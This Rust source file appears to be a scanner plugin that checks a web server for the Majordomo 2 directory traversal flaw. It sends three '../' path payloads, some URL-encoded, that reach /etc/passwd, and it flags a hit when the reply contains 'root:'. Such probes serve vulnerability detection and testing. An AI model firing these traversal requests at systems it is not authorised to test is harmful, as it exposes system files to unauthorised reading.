/* http-majordomo2-dir-traversal-2 - Majordomo 2 directory traversal probe. */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let paths = [
        "/majordomo/..%2f..%2f..%2fetc/passwd",
        "/majordomo2/..%2f..%2fetc/passwd",
        "/majordomo/../../etc/passwd",
    ];
    let mut out = String::new();
    let mut found = 0usize;

    if !valid(ctx) {
        return 1;
    }
    for path in paths.iter() {
        let resp = match http_request(ctx, "GET", path, None, "", "", None, 8192) {
            Some(r) if !r.is_empty() => r,
            _ => continue,
        };
        let code = http_status(&resp);
        if contains_ci(http_body(&resp), "root:") {
            if found == 0 {
                out.push_str("VULNERABLE: ");
            } else {
                out.push_str(", ");
            }
            out.push_str(&format!("{}", path));
            found += 1;
        }
    }
    if found == 0 {
        set_out(ctx, "not vulnerable: Majordomo 2 path traversal");
    } else {
        out.push_str(" (Majordomo 2 path traversal)");
        set_out(ctx, &out);
    }
    0
}
